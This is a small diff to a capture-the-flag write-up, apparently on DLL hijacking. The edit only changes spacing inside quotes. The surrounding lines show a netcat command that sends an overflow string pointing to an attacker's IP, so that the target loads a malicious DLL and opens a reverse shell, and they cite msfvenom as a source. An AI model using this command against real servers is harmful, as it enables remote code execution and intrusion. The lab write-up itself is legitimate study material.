@@ -33,7 +33,7 @@ And the you can launch your DLL on the server with this command :
 ```
 echo '(stringlongenoughtodotheerror)//youripadress@80/msf' | nc 10.1.2.13 1234
 ```
-It'll launch the nc command and the enter the string between the '' after the echo. Now in the shell where you have executed the reverse shell command, you have to the server and get the flag who is in the .txt file !
+It'll launch the nc command and the enter the string between the ' ' after the echo. Now in the shell where you have executed the reverse shell command, you have to the server and get the flag who is in the .txt file !
 ## Sources
 msfvenom : 
 * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
